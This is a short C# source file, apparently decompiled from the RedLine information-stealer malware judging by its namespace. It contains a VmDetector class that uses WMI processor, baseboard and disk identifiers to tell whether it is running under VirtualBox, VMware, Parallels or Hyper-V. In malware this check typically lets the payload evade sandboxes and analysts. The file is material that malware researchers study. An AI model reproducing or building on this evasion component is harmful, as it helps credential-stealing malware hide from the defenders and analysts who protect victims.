using RedLine.Models;
using RedLine.Models.WMI;
using System.Collections.ObjectModel;
using System.Management;

namespace RedLine.Logic.Others
{
  public class VmDetector
  {
    private readonly IWmiService _wmiService;

    public VmDetector(IWmiService wmiService)
    {
      this._wmiService = wmiService;
    }

    public MachineType GetMachineType()
    {
      WmiProcessor wmiProcessor = this._wmiService.QueryFirst<WmiProcessor>((WmiQueryBase) new WmiProcessorQuery());
      if (wmiProcessor.Manufacturer != null)
      {
        if (wmiProcessor.Manufacturer.Contains("VBoxVBoxVBox"))
          return MachineType.VirtualBox;
        if (wmiProcessor.Manufacturer.Contains("VMwareVMware"))
          return MachineType.VMWare;
        if (wmiProcessor.Manufacturer.Contains("prl hyperv"))
          return MachineType.Parallels;
      }
      WmiBaseBoard wmiBaseBoard = this._wmiService.QueryFirst<WmiBaseBoard>((WmiQueryBase) new WmiBaseBoardQuery());
      if (wmiBaseBoard.Manufacturer != null && wmiBaseBoard.Manufacturer.Contains("Microsoft Corporation"))
        return MachineType.HyperV;
      ReadOnlyCollection<WmiDiskDrive> readOnlyCollection = this._wmiService.QueryAll<WmiDiskDrive>((WmiQueryBase) new WmiDiskDriveQuery(), (ManagementObjectSearcher) null);
      if (readOnlyCollection != null)
      {
        foreach (WmiDiskDrive wmiDiskDrive in readOnlyCollection)
        {
          if (wmiDiskDrive.PnpDeviceId.Contains("VBOX_HARDDISK"))
            return MachineType.VirtualBox;
          if (wmiDiskDrive.PnpDeviceId.Contains("VEN_VMWARE"))
            return MachineType.VMWare;
        }
      }
      return MachineType.Unknown;
    }
  }
}
